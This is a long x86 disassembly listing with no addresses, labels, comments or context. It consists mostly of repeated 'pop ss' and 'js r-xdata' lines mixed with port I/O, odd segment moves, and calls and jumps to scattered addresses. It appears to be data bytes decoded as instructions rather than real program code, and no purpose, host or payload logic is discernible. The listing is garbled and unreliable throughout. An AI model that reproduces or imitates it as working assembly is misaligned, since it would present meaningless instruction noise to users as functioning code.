pop ss
sub dl [ edi ]
pop ss
adc [ gs : 0x1a011717 ] dl
sub bh ah
js r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
insd
adc al 0x63
js r-xdata
out 0x6d eax
lodsd [ esi ]
cmp [ esi - 0x37afe48 ] bh
call 0x78be8b1f
out 0x6c eax
push cs
sub al 0x17
pop ss
and [ gs : 0x6d651717 ] dl
and [ ecx ] eax
cmp ah ch
call 0x63be8b04
cwde
aam 0xeb
sbb [ ecx ] al
xchg ebp eax
or edx [ edi ]
pop ss
js r-xdata
insb
pop ss
mov eax 0x105c6565
pop ss
pop ss
add [ ecx + 0x39 ] al
pop ss
pop ss
mov cl 0x6b
adc cl ch
and [ 0x41001717 ] dl
or al 0x17
call 0xffffffffbda9fa86
loopne r-xdata
mov edx 0x78e8e8eb
js r-xdata
js r-xdata
add edx [ edi ]
pop ss
js r-xdata
in eax dx
sub edi [ eax + 0x78 ]
js r-xdata
jmp 0xffffffffe932da72
pop ss
pop ss
scasd [ edi ]
add [ 0x78e8e8ea ] ebx
js r-xdata
lodsd [ esi ]
xor al 0xd3
scasb [ edi ]
fadd [ ecx ]
inc ecx
sbb al 0x17
call 0xffffffffbb5def24
scasd [ edi ]
pop ss
jle r-xdata
insd
xor [ edi + 0x17 ] edx
pop ss
mov esi 0x170c5000
pop ss
popfd
sbb al 0x17
mov edi 0x321019c
pop ss
pushfd
mov fs [ ecx - 0x6b ]
js r-xdata
js r-xdata
js r-xdata
add [ ebp + 0x78e8e8fc ] eax
js r-xdata
call 0x78be8ac4
js r-xdata
pop ss
js r-xdata
insd
adc al ch
js r-xdata
call 0x78be8e5c
js r-xdata
pop ss
js r-xdata
js r-xdata
shr [ ebx ] cl
out 0x6c eax
and al 0xe0
call 0x120e15f2
pop ss
pop ss
mov dl 0x1
cmpsd [ esi ] [ edi ]
pop ss
pop ss
js r-xdata
pop ss
fld [ eax ]
js r-xdata
0x7878e8e8 0x7878
js r-xdata
pop ss
js r-xdata
call 0x1d47fc2d
call 0xffffffffea63152e
out 0x6a eax
xor dl [ edi ]
pop ss
fld [ eax ]
popad
lodsb [ esi ]
int3
js r-xdata
pop eax
xchg ebp eax
js r-xdata
js r-xdata
pop ss
arpl [ ebp + 0x19610138 ] bp
pop ss
pop ss
js r-xdata
or [ ecx - 0x71617d50 ] 0x61
lodsd [ esi ]
sbb [ eax + 0x5019882 ] dh
loopne r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
mov cl 0x6d
sub bh ah
insb
and dl [ edi + 0x17 ]
pop ss
fld [ eax ]
mov dh 0xb3
adc eax 0xbbb81717
js r-xdata
call 0x357116db
js r-xdata
js r-xdata
mov edi 0x79501e0
js r-xdata
js r-xdata
loopne r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
add ebp ebp
add [ ebp + 0x10 ] esp
pop ss
mov fs [ ecx - 0x4b ]
adc [ ebx + 0x36 ] ah
mov fs [ ecx - 0x4b ]
adc ah [ ebx + 0x30 ]
mov fs [ ecx - 0x4b ]
call 0x16c4156b
add [ ebp + 0x17555a01 ] 0x17
pop ss
js r-xdata
sub [ eax + 0x17020701 ] ch
js r-xdata
insb
loop r-xdata
popfd
loopne r-xdata
lodsd [ esi ]
xchg ebp eax
mov bh 0x1
add [ edx ] ebx
pop ss
pop ss
js r-xdata
cmp al 0x1
push ss
push esi
pop ss
pop ss
imul ebp [ esp ] 0x6d
sub bh ah
insb
push ebp
pop ss
js r-xdata
js r-xdata
sbb [ eax + 0x170aed01 ] 0x17
mov esi 0xe7286da4
insb
add al 0x68
add [ ebx ] ch
js r-xdata
cld
insd
sub al 0x68
call 0x182e9802
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
js r-xdata
pop es
xchg ebp eax
js r-xdata
add [ edi + 0x78171755 ] eax
js r-xdata
js r-xdata
pop ss
js r-xdata
add dl [ edi ]
add [ edi ] eax
arpl [ edx ] bp
mov fs [ ecx - 0x53 ]
[ edi + 0x1d ] ebp
pop ss
pop ss
js r-xdata
push 0xe7eaf895
insd
add [ ecx ] ch
pop ss
pop ss
js r-xdata
call 0xffffffffe9303048
call 0x78be8bc4
js r-xdata
js r-xdata
xor eax 0x2c6b1717
and [ ebx ] ebp
js r-xdata
outsb
sub al 0xf0
js r-xdata
js r-xdata
or [ edi ] edx
jg r-xdata
call 0xffffffff832efd80
call 0xffffffffc912b134
push ebp
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
sub al 0x65
lodsd [ esi ]
dec esp
add [ ecx + ecx + 0x17 ] esi
add [ edi + 0x53d101b0 ] 0x17
pop ss
js r-xdata
sub al 0xe4
add [ edi ] edx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
pop ss
arpl [ ecx + edi * 4 ] ax
mov ecx 0xe8ef1d01
call 0x3bf6164d
pop ss
clc
0x29006de7 0x1717
mov ebx 0x17349d17
test al 0x1
pop es
js r-xdata
js r-xdata
sbb eax 0x78e8e8ea
js r-xdata
add [ ebp - 0x18 ] edi
call 0xfffffffff8981719
call 0x595188e
pop ss
insd
and [ 0xffffffffbbb81717 ] dl
js r-xdata
js r-xdata
js r-xdata
popad
js r-xdata
js r-xdata
pushfd
int3
js r-xdata
js r-xdata
pop ss
call 0x201fd75
adc [ gs : edi ] dl
pop ss
js r-xdata
cmp edx [ edi ]
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add [ edi + 0x3a ] eax
pop ss
pop ss
js r-xdata
js r-xdata
js r-xdata
call 0x2921fd32
mov dh 0xb3
add [ edx + 0x36 ] esi
sub cl [ esi + 0x1f0ad61 ]
outsd
sbb eax 0x78781717
call 0x78be8c33
or [ eax + 0x17bc9e17 ] bh
lodsd [ gs : esi ]
js r-xdata
sbb al 0xe8
call 0x519396e9
js r-xdata
pop ss
mov ebx 0x17558701
pop ss
lodsb [ esi ]
int3
enter 0xbe17 0x9c
js r-xdata
jmp r-xdata
js r-xdata
add [ esi ] ecx
sbb al 0xe9
call 0xffffffffe1052c4d
pop ss
jg r-xdata
popfd
xor al 0x17
add [ edi ] dl
pop ss
js r-xdata
sbb [ ecx ] al
push cs
pop ss
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
push esi
js r-xdata
push es
pop ss
pop ss
js r-xdata
or al 0x6
js r-xdata
jmp r-xdata
mov esi 0xccac179c
cld
arpl [ esp + ecx * 8 - 0x13502c04 ] bp
js r-xdata
call 0x78be8ded
js r-xdata
pushfd
int3
sbb [ ecx + ebp * 8 ] 0xe8
call 0x1826d37d
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
imul ebp [ esp ] 0x1
js r-xdata
pop ss
js r-xdata
call 0x175c3ff7
js r-xdata
rol [ eax - 0x17172718 ] 0x1
push eax
movhps [ edi ] xmm2
js r-xdata
js r-xdata
mov cl 0x82
js r-xdata
js r-xdata
js r-xdata
js r-xdata
popfd
clc
pop ss
popfd
in al 0x17
js r-xdata
add [ edi ] edx
pop ss
js r-xdata
popad
call 0x177b40f4
js r-xdata
jmp 0xffffffffbf5dfd4c
pop ss
pop ss
in al 0x1
arpl [ eax ] bx
insd
and al ch
popad
outsb
js r-xdata
js r-xdata
outsb
pushfd
js r-xdata
sub al 0x63
sbb [ esi + ecx * 4 - 0x4ed55a9f ] 0x82
js r-xdata
cmp al 0x65
lodsd [ esi ]
or al 0x1
pop ss
pop ss
pop ss
js r-xdata
0xbebbe8e8 0xac82
pop ss
sub [ ebx + ebx * 8 + 0x60ad6533 ] 0xbb
mov eax 0x17044301
pop ss
js r-xdata
call 0x2221fe9d
add [ 0x1f171711 ] esp
sub esi [ 0x2c6b1717 ]
js r-xdata
push eax
call 0x2f46ffd6
xor al 0x17
js r-xdata
add dl [ eax + 0x17 ]
out 0x6c eax
push ss
sbb [ edi ] dl
pop ss
add [ ebp + 0x3e ] esp
pop ss
pop ss
arpl [ ebx + 0x61ec82fc ] bp
lodsb [ esi ]
int3
sub dh [ ecx + 0x618e9d82 ]
movsd [ edi ] [ esi ]
popad
js r-xdata
mov fs [ ecx - 0x5b ]
js r-xdata
push edx
popfd
clc
scasb [ edi ]
add [ edi ] esp
aaa
pop ss
pop ss
js r-xdata
and eax 0x1f171711
mov al [ ecx ]
fucom st0
call 0x78be8f25
lodsd [ gs : esi ]
js r-xdata
pop ss
js r-xdata
pop ss
or [ ebx - 0x3b ] 0xb
idiv [ edi + 0xc0ae61 ]
push ecx
xor al 0x17
pop ss
cmp [ ebx - 0x40e51e8a ] 0x61
scasb [ edi ]
int3
call 0x347517d7
pop ss
mov edi 0xec571863
jmp 0x6605ff64
js r-xdata
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
js r-xdata
pop ss
js r-xdata
pop ss
rcl [ esp + ecx * 8 + 0x500201dc ] 0x1
pop ss
js r-xdata
lodsb [ esi ]
mov eax 0x1725d501
js r-xdata
imul ebp [ eax + esi * 8 ] 0x61
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
js r-xdata
aaa
add ebp eax
and edx [ edi ]
sbb [ ebp + 0x2ca5618e ] 0x63
add ecx ecx
popfd
mov fs [ ecx - 0x5b ]
mov cl 0x82
js r-xdata
xchg esp eax
int3
js r-xdata
add ebp edx
js r-xdata
js r-xdata
mov ebp 0x36f900e4
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
push edi
pop ss
pop ss
js r-xdata
leave
fadd [ ecx ]
and eax 0x78781717
js r-xdata
js r-xdata
add [ ecx - 0x1a ] ebp
call 0x78be91ba
js r-xdata
js r-xdata
pop ss
mov eax 0xe09d17
add cl bh
add [ esi - 0x4ee8e8f9 ] ch
and [ ebx ] ebp
js r-xdata
pop ss
arpl [ ebp + 0x36f900e4 ] di
js r-xdata
pop ss
pop ss
js r-xdata
and [ ecx ] eax
add [ eax ] eax
pop ss
pop ss
mov eax 0x17238701
pop ss
js r-xdata
pop ss
out 0x6c eax
test eax 0x63171734
cmpsb [ esi ] [ edi ]
rol [ ecx ] 0xc8
pop ss
pop ss
imul edx [ eax ] 0xffffffe9
out 0x6c eax
xor edi ebp
call 0xffffffffd15df2aa
call 0x174b65a8
mov ch 0xf8
out 0x6d eax
jne r-xdata
pop ss
js r-xdata
lds esp [ ebx ]
pop ss
mov edi 0xe8ebba01
pop ss
js r-xdata
js r-xdata
insb
std
mov edi 0x17354700
pop ss
mov cl 0xb1
insd
sub [ ecx ] al
mov eax 0xdb17171a
sub [ eax + 0x78782b21 ] ch
call 0x4dc6fee8
push ecx
sub bh ah
insb
mov ah 0x35
pop ss
pop ss
pop ss
sahf
mov esp 0x1732a101
pop ss
js r-xdata
add bl ch
and dl [ edi ]
pop ss
imul ebp [ esp + edi * 8 ] 0x6d
sbb al 0x17
js r-xdata
out 0xe8 al
call 0x78be914b
js r-xdata
fsub [ eax ]
js r-xdata
pop ss
in al 0x0
stc
js r-xdata
pop ss
pop ss
add [ edi + 0x6317172a ] ah
arpl [ ecx ] bp
and [ ebx ] ebp
js r-xdata
js r-xdata
js r-xdata
imul esp [ edi + edx ] 0x17
pop ss
pop ss
insd
and [ 0x1b81717 ] dl
popad
xor esp edi
js r-xdata
pop ss
js r-xdata
pop ss
js r-xdata
add eax 0x78781717
js r-xdata
rol [ 0x78781717 ] 0x1
pop ss
js r-xdata
scasb [ edi ]
pop ss
js r-xdata
pop ss
add [ ecx + 0xd ] ecx
pop ss
pop ss
js r-xdata
mov ebx 0x65bbbbbb
insd
js r-xdata
pop ss
js r-xdata
insb
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
insd
cmp al 0x15
pop ss
pop ss
mov eax 0x3c5561bb
adc eax 0x89011717
push edi
pop ss
pop ss
mov eax 0xb8ef5ee7
add [ eax + 0xc ] edi
pop ss
pop ss
js r-xdata
dec eax
mov ebx 0x6d65bbbb
adc eax 0x17b81717
mov edi 0x7f17bbb8
inc esp
mov ebx 0x486d65bb
js r-xdata
call 0xffffffffe8c903f5
pop ss
jle r-xdata
das
lodsd [ esi ]
pop esp
mov al 0x8d
xchg [ esi - 0x5aaf52d1 ] bh
movsd [ edi ] [ esi ]
mov al 0x8d
das
lodsd [ esi ]
push esp
xchg [ esi - 0x2cff5a5b ] bh
xor [ edi ] edx
pop ss
mov bh 0xb6
mov bl 0x6d
add [ esi + ecx ] esp
js r-xdata
call 0xffffffffccea7dbb
clc
in al dx
add ebx edx
sub ah ch
out 0x6c eax
js r-xdata
js r-xdata
js r-xdata
xor [ edi ] edx
pop ss
js r-xdata
shl [ ecx ] 0x1
pop ss
pop ss
arpl [ ecx + ebp * 2 ] ax
pop ss
js r-xdata
insd
js r-xdata
lea esi [ eax + 0x14ad618e ]
call 0x124803fd
adc [ edi ] edx
pop ss
js r-xdata
fld [ eax ]
mov fs [ ecx - 0x53 ]
push ss
lodsd [ gs : esi ]
sbb [ ecx ] al
push esp
and al 0x17
pop ss
mov fs [ ecx - 0x6b ]
arpl [ cs : esi ] dx
mov fs [ ecx - 0x6b ]
and [ ecx ] al
sbb eax 0x7817172e
mov fs [ ecx - 0x4b ]
clc
popad
lodsd [ esi ]
js r-xdata
pop ss
pop ss
fld [ eax ]
mov cl 0xb1
popad
push cs
js r-xdata
insd
and edi esp
insb
js r-xdata
js r-xdata
add dl al
cmp edx [ edi ]
pop ss
insd
sub [ ecx ] al
imul esp esi 0x7878e8e8
js r-xdata
insb
out 0x32 al
pop ss
out 0x6c eax
pop ss
add [ edi ] ebp
xor dl [ edi ]
js r-xdata
call 0xbce8504
pop ss
pop ss
imul ebp [ eax ] 0xffffffea
add [ edi ] esi
or dl [ edi ]
add al 0xf8
in al dx
call 0x24ec199f
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
pop ss
mov eax 0x1782f682
and [ gs : 0x57001717 ] dl
push edi
pop ss
pop ss
add [ eax ] ebx
or eax 0x6ce71717
out dx eax
call 0x20aa03bf
add [ ecx ] dl
and edx [ edi ]
pop ss
pop ss
pushfd
int3
add al 0x17
pop esp
in al dx
out 0x6c eax
js r-xdata
push edi
pop ss
pop ss
js r-xdata
rcl [ edi + 0x17 ] cl
inc eax
js r-xdata
add [ edi ] ecx
push edx
pop ss
pop ss
js r-xdata
movsd [ edi ] gs : [ esi ]
adc al 0xb9
mov eax 0x17537201
pop ss
lodsd [ gs : esi ]
xor al 0xb8
lodsd [ gs : esi ]
push 0x1707e701
js r-xdata
pop ss
pop ss
js r-xdata
add al 0x15
js r-xdata
cli
arpl [ edi ] si
mov fs [ ecx - 0x4b ]
lodsb [ esi ]
sbb [ edx - 0x4a9e714d ] 0xae
add [ edx + 0x78171703 ] ebp
js r-xdata
popad
xchg ebp eax
adc [ ecx ] al
xor [ edi ] dl
pop ss
js r-xdata
lodsd [ esi ]
adc al 0xb8
pop ss
aas
add [ eax - 0x47e8e8de ] edi
xor dh 0x82
pop ss
pop ss
js r-xdata
sbb dh [ eax + 0x618ec682 ]
lodsd [ esi ]
sbb al 0xb0
mov fs [ ecx - 0x53 ]
push ds
or [ ebp - 0x529e7150 ] 0x10
adc [ eax - 0x529e7150 ] 0x12
or [ ebp - 0x529e7150 ] 0x14
mov fs [ ecx - 0x53 ]
mov ch 0x10
js r-xdata
js r-xdata
pop ss
pushfd
int3
call 0xfffffffff8f17fd8
mov ebx 0x1739e001
pop ss
js r-xdata
js r-xdata
mov cl 0x1
js r-xdata
or eax 0x65781717
insd
dec eax
adc eax 0x30011717
das
sub al 0x1
pop ebp
call 0x78bf015b
js r-xdata
add al 0xe0
0x6d65e8e8 0x1510
add al 0x69
call 0xffffffff8cc900d1
add edx esp
adc eax 0x78781717
add [ esi + 0x618e2063 ] 0xa5
sbb [ ecx ] al
cld
out dx al
call 0xffffffffdd17a6e8
stc
out 0x6d eax
out 0xe8 al
call 0xffffffffea7083f2
mov gs [ ebx - 0x2c ]
stc
mov eax 0xbbb8bf17
pop ss
jg r-xdata
js r-xdata
popad
lodsd [ esi ]
insd
pop ss
js r-xdata
xor dl [ edi ]
pop ss
arpl [ ebp + 0x32dc00e4 ] di
pop ss
pop ss
mov ebp 0x32c4001c
pop ss
pop ss
pop ss
adc eax 0xd4001717
js r-xdata
popfd
loopne r-xdata
js r-xdata
add edx ecx
push ss
pop ss
pop ss
mov fs [ ecx - 0x53 ]
xor [ ebx + 0x29 ] ah
add [ eax + ebx + 0x17 ] ebp
pop ss
js r-xdata
js r-xdata
das
js r-xdata
call 0xffffffff805785c7
out 0x6a eax
inc ebx
in al dx
call 0xffffffffe75d87d0
insd
dec ebx
in al dx
lodsd [ esi ]
cmp al 0xb8
add ecx esi
aas
pop ss
pop ss
js r-xdata
push ebx
js r-xdata
salc
js r-xdata
and [ edi ] dl
add [ eax ] esi
js r-xdata
pop es
pop ss
pop ss
mov cl 0x21
sub edi [ eax + 0x78 ]
mov ch 0x14
popad
movsd [ edi ] [ esi ]
sbb al 0x61
mov ebp 0x14ad6310
popad
lodsd [ esi ]
or al 0x63
lodsd [ esi ]
adc [ ecx - 0x53 ] ah
add [ ebx - 0x53 ] ah
sbb al 0x61
lodsd [ esi ]
add al 0xdb
sub bl bl
cmp al [ ecx ]
imul esp [ 0x78781717 ] 0x78
js r-xdata
js r-xdata
js r-xdata
js r-xdata
js r-xdata
add ah dl
insd
pop ss
js r-xdata
add [ edi + edx ] dl
pop ss
add esi edx
xor [ edi ] dl
pop ss
imul edx [ ebp - 0x1fe171c ] 0x38
pop ss
pop ss
js r-xdata
insd
js r-xdata
sub bh ah
insb
pop ss
js r-xdata
js r-xdata
js r-xdata
sub bh ah
insb
sbb al 0x4
pop ss
pop ss
add [ ebx + 0x78781717 ] edx
js r-xdata
mov dh 0xb3
insd
call 0x2922032c
popad
mov ch 0x8
popad
mov ch 0x1c
mov ss bx
scasb [ edi ]
out dx al
out 0x6b eax
aaa
xor al 0x17
pop ss
add [ edi - 0x47e8e8f0 ] edi
sub dl 0x80
test [ ss : edi ] edi
dec ebx
pop ss
pop edi
and al 0xe8
call 0x4a11c52
pop ss
pop ss
out 0x6c eax
push cs
pop ss
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
call 0x1c1285fa
pop ss
pop ss
mov gs [ ebx - 0x2e ]
call 0xffffffff8f304276
imul edx esp 0xfffffff9
xchg edi eax
js r-xdata
js r-xdata
movsd [ edi ] [ esi ]
add [ ebp - 0x53 ] ah
js r-xdata
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ esi + 0x6514ad61 ] cl
arpl [ ebx + ebp * 2 ] ax
add al 0xb0
add [ edx + 0x3f ] edx
pop ss
pop ss
js r-xdata
lodsd [ esi ]
sbb al 0xbb
pop ss
mov ebp 0x46d65f8
adc al 0x65
and edi esp
insb
or ebx [ 0x26001717 ]
aas
pop ss
pop ss
insd
sub [ ecx ] al
js r-xdata
mov eax 0x172fd501
pop ss
js r-xdata
stosb [ edi ]
add [ eax ] edx
out dx eax
call 0x61d494a5
clc
mov gs [ ebp + 0x3a ]
out 0x6c eax
bound esp [ ebx ]
pop ss
pop ss
add [ ebp + 0x5b ] ebp
pop ss
pop ss
sub ah 0x80
call 0x182f04ac
sahf
mov eax 0x687f17bb
call 0xffffffff9e5e04c7
mov eax 0xbb1cad61
lodsd [ gs : esi ]
dec esp
add esp edx
pop ss
pop ss
movsd [ edi ] gs : [ esi ]
pop esp
sub al 0x17
add esi edx
js r-xdata
pop ss
js r-xdata
js r-xdata
in al dx
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
mov eax 0xe8e9ec80
call 0xffffffffe896969a
call 0x16e8670
push esp
das
pop ss
pop ss
js r-xdata
insb
loop r-xdata
jmp 0x60138b7d
js r-xdata
js r-xdata
push ebx
js r-xdata
inc eax
das
lodsd [ esi ]
add [ ebx + 0x2fa3a5be ] ah
lodsd [ gs : esi ]
mov ebp 0x175af501
arpl [ ebp + 0x14ad61e0 ] bp
add [ ebp + edx * 2 + 0x17 ] ebp
js r-xdata
js r-xdata
mov fs [ ecx - 0x6b ]
push ds
add [ ebx ] edx
push ds
pop ss
pop ss
or [ edx - 0x529e7150 ] 0x10
sbb [ ebx - 0x529e7150 ] 0x12
fld [ eax ]
mov fs [ ecx - 0x53 ]
js r-xdata
and al 0xe
js r-xdata
js r-xdata
call 0xffffffff94b3800a
js r-xdata
scasb [ edi ]
out dx al
out 0x6b eax
loop r-xdata
call 0xffffffff832f1214
jmp r-xdata
pop ss
mov al 0x8e
popad
lodsd [ esi ]
adc al 0xdb
sub [ esi + 0x116ad61 ] cl
mov esi esp
call 0x78be9205
out 0x7 eax
pop ss
out 0x5f eax
scasb [ edi ]
out dx al
pop ss
lodsd [ esi ]
sbb al 0x1
add eax 0x78171718
js r-xdata
call 0xffffffffc8dd8979
int 0x5f
pop ss
pop ss
imul edx [ edi + 0x6de7e9f4 ] 0x1e
jmp r-xdata
insd
js r-xdata
js r-xdata
out 0x6c eax
js r-xdata
pop ss
js r-xdata
mov edi 0xc8ae61
mov [ esi ] edi
movsd [ edi ] [ esi ]
mov [ 0x31de01be ] eax
pop ss
pop ss
js r-xdata
movsd [ edi ] [ esi ]
mov [ 0xffffffffbe04ad2f ] eax
js r-xdata
js r-xdata
mov bh 0xb6
add [ 0xffffffff80e8e8e0 ] ecx
cmp bh ch
js r-xdata
sub al 0xf0
insd
sub bh ah
insb
pop ss
add eax 0x17821717
mov eax 0xb401ea82
sub edx [ edi ]
pop ss
pop ss
js r-xdata
push ebp
pop ss
nop
0xc5201e8 0x1717
js r-xdata
add [ edi ] ecx
js r-xdata
insd
sub edi [ eax + 0x78 ]
pop ss
pop ss
js r-xdata
call 0x174ac0b4
pop ss
js r-xdata
push ss
add [ ecx + 0x78e8e8e6 ] ecx
js r-xdata
js r-xdata
jge r-xdata
js r-xdata
call 0xffffffffe10434ca
insd
push esp
adc dl [ edi ]
pop ss
mov eax 0x1c4be17
0x1707
out dx eax
push edi
or ah [ eax ]
pop ss
pop ss
insd
sub bh ah
insb
sub bl [ 0x4d011717 ]
sbb eax 0x2bb61717
adc eax 0x17173f
mov eax [ 0xffffffffb8be63d4 ]
add [ edi + 0x1c ] ebx
aas
sbb al 0x17
pop ss
add [ esi + 0x6317170c ] ah
movsd [ edi ] [ esi ]
loopne r-xdata
js r-xdata
lodsd [ esi ]
add al 0xbe
das
pop ss
js r-xdata
mov dl 0x82
or [ esi - 0x4dff429f ] 0x618e9a82
mov ebp 0x5d0e0102
pop ss
pop ss
js r-xdata
pop ss
js r-xdata
add ebp esi
pop edx
pop ss
js r-xdata
sub al 0xe8
js r-xdata
pop ss
mov fs [ ecx - 0x4b ]
inc eax
mov bl 0x8e
popad
mov ch 0x42
add ebp edi
pop ds
pop ss
pop ss
pop ss
popfd
add [ edi ] dl
jg r-xdata
pop ss
mov eax 0x172a6401
out 0x6d eax
cmc
or edx [ edi ]
pop ss
add [ edi ] ebp
push edi
pop ss
pop ss
add [ eax ] 0xeb
call 0x747da7
jpe r-xdata
out 0xe8 al
call 0x78be9196
lodsd [ esi ]
adc al 0x1
pop ss
js r-xdata
mov eax 0x168ad65
add [ cs : edx + 0x7817171a ] esp
mov ss bx
imul edx [ ebx ] 0xffffffe1
add [ ecx + 0x7817171b ] edi
mov eax 0xe8e98d01
call 0xffffffff8e7481a9
popad
lodsd [ esi ]
arpl [ ecx ] dx
out 0x6c eax
std
call 0xffffffff94b2066d
popad
lodsd [ esi ]
sbb al 0xd3
das
add [ edi + ebp + 0x78781717 ] ebx
js r-xdata
js r-xdata
pop [ ecx ]
movaps [ edi ] xmm2
js r-xdata
arpl [ eax ] sp
mov fs [ ecx - 0x53 ]
adc bl bl
sub [ edx - 0x529e7170 ] al
adc al 0x1
das
insd
mov bh [ edx ]
pop ss
pop ss
add [ edx + 0x1717172d ] ebp
popfd
sbb al 0x1
mov eax 0x78171703
js r-xdata
das
pop ss
pop ss
cmp [ edi - 0x5 ] 0xc9
push esi
mov edi 0xe0ae61
mov ebx 0x8017173e
adc [ edi + edx * 8 ] ah
mov eax [ 0xffffffffecae61bf ]
add [ ebp + 0x117173e ] ch
popad
scasb [ edi ]
enter 0x8900 0x3e
js r-xdata
add al 0xb0
add [ ecx + 0x17097e01 ] 0x17
js r-xdata
mov fs [ ecx - 0x53 ]
pop ss
js r-xdata
clc
call 0xffffffffe0c704b1
and [ ecx - 0x35 ] 0x17
pop edi
sub al 0xe8
call 0x2ac11a23
pop ss
pop ss
add ebp esp
jmp r-xdata
pop ss
js r-xdata
js r-xdata
pop ss
pop ss
arpl [ eax ] si
imul ebp [ esp ] 0x6d
pop ss
pop ss
add eax edx
or edx [ edi ]
pop ss
add [ esp + edi ] dl
js r-xdata
js r-xdata
js r-xdata
lodsd [ esi ]
in al 0xe7
insb
push 0x25
pop ss
js r-xdata
lodsd [ esi ]
adc [ edi ] dl
mov edi 0x1286dbc
std
xor [ edi ] edx
pop ss
js r-xdata
cmp [ eax ] 0xe9
jmp 0xffffffffbb79faca
popad
mov ch 0xc
or [ edi + 0x17290f01 ] 0x17
pop ss
add [ 0xffffffffbe7e8b13 ] 0x1
add edx [ edi ]
pop ss
js r-xdata
js r-xdata
call 0xffffffffccda896e
cld
jmp 0xffffffffe9288a73
js r-xdata
sub ah 0xe9
js r-xdata
js r-xdata
js r-xdata
adc al 0x3c
js r-xdata
pop ss
js r-xdata
js r-xdata
arpl [ esi ] bp
add [ edi + 0xe ] cl
js r-xdata
push 0x61e8e8e8
outsb
sub al ch
call 0xffffffffe771f2d9
popad
lodsd [ esi ]
push es
mov al 0x82
lea esi [ ebx + 0x18ad618e ]
sbb [ edx + 0x12b63 ] 0xea
call 0x78be9855
js r-xdata
js r-xdata
pop ss
pop ss
or al 0x17
pop ss
arpl [ ebp - 0x2b5e9c20 ] sp
arpl [ esi + 0x1c5f01b8 ] di
and [ gs : 0xfffffffff0001717 ] dl
sub [ edi ] dl
insd
and [ 0x17b81717 ] dl
mov esi 0x6b21db8c
adc [ edi ] dl
out 0x7d eax
sub [ ebx + 0x11 ] esp
enter 0xe7e9 0x6d
imul edx [ esp + ecx * 8 + 0x6ce7e9fc ] 0xffffffe2
call 0xffffffff97b20678
js r-xdata
jmp 0x6dac0309
js r-xdata
adc [ ecx ] al
js r-xdata
js r-xdata
insb
popad
lodsd [ esi ]
adc al 0x1
imul edx [ esp + ecx * 8 + 0x6ae7fcf8 ] 0xffffff86
das
js r-xdata
js r-xdata
pop ss
pop ss
lodsd [ esi ]
insd
pop ss
js r-xdata
js r-xdata
call 0x28b480d3
call 0x2c1a07d8
out 0x6d eax
js r-xdata
int3
add [ edi + 0x7817171a ] edi
arpl [ edi ] bp
call 0x15da8788
pop ss
and [ ebx ] ebp
js r-xdata
0x1716
insd
js r-xdata
pop ss
call 0x1fe0782
jo r-xdata
int3
js r-xdata
push esi
js r-xdata
js r-xdata
js r-xdata
pop ss
add [ ebp + 0x38 ] ebp
pop ss
pop ss
js r-xdata
[ edi ] dl
popad
mov ebp 0x618eb28a
mov ebp 0xfac018c
pop ss
pop ss
js r-xdata
adc eax 0x1b81717
sub dl [ fs : edi ]
js r-xdata
jb r-xdata
out 0x6c eax
js r-xdata
insd
sub esp edi
pop ss
pop ss
js r-xdata
pop ss
pop ss
sub al 0x17
jle r-xdata
cld
out 0x6a eax
xchg [ edi ] ch
mov cl 0x82
pushfd
add [ eax ] ebp
add eax 0x28db1717
mov dl 0x38
mov esi 0x17106b8c
js r-xdata
pop ss
js r-xdata
pop ss
pop ss
mov cl 0x6d
sub bh ah
insb
jmp r-xdata
add [ cs : edi + 0xe ] cl
in al 0x8
pop ss
pop ss
retn
out 0x6d eax
pop ss
call 0x5d4747d5
lea ecx [ esi - 0x4fc5529f ]
add [ esi + 0x17028801 ] 0x17
sub edx [ edi ]
sub [ ecx ] al
js r-xdata
cli
sub [ edi ] edx
js r-xdata
out 0x6d eax
imul edx [ eax ] 0x17
js r-xdata
mov ebx 0xae65ec82
js r-xdata
js r-xdata
fld [ eax ]
mov dh 0xb3
and [ ebx ] ebp
js r-xdata
pop ebp
xor [ ebp + 0x17 ] ch
js r-xdata
pop ss
arpl [ eax ] dx
arpl [ esi ] bp
js r-xdata
pop ss
js r-xdata
fdivr [ eax + 0x6310ad63 ]
push 0xe8e8e84c
imul ebp [ eax ] 0xffffffe0
add [ ecx + 0x5c ] esp
pop ss
pop ss
imul edx [ ebp - 0x33fe17ec ] 0x38
pop ss
pop ss
js r-xdata
in al dx
js r-xdata
test al 0x1
js r-xdata
js r-xdata
js r-xdata
pop ss
js r-xdata
add [ eax + 0x78171737 ] ebx
js r-xdata
pop ss
js r-xdata
add ch bh
adc [ ebx + 0x2e ] ah
js r-xdata
test eax 0x8217175b
jmp 0xffffffffc812cde7
insd
js r-xdata
scasb [ edi ]
[ ecx + eax + 0x17173ed0 ] 0x78
call 0x7c480973
pop ss
salc
js r-xdata
aaa
pop ss
sub eax 0x2d011717
sub [ esi + 0x6502ad61 ] cl
js r-xdata
js r-xdata
scasb [ edi ]
js r-xdata
js r-xdata
cwde
aaa
js r-xdata
inc edi
add ch bh
js r-xdata
pop ebx
js r-xdata
or edx [ edi ]
insb
add [ edx - 0x15 ] ebp
js r-xdata
pop ss
pop ss
js r-xdata
sub edi [ eax + 0x78 ]
js r-xdata
sub esp edi
insb
neg [ edi + edx ]
pop ss
arpl [ eax ] sp
add [ edx + eax ] edi
push esp
adc dl [ edi ]
pop ss
popad
lodsd [ esi ]
js r-xdata
pop ss
js r-xdata
arpl [ ebp - 0x44169e1c ] sp
add [ ebp - 0x14e8e8f8 ] edx
lodsd [ esi ]
loopne r-xdata
js r-xdata
pop ss
add dl [ edi ]
js r-xdata
pop ss
pop ss
js r-xdata
js r-xdata
std
js r-xdata
pop ss
sub cl 0x65
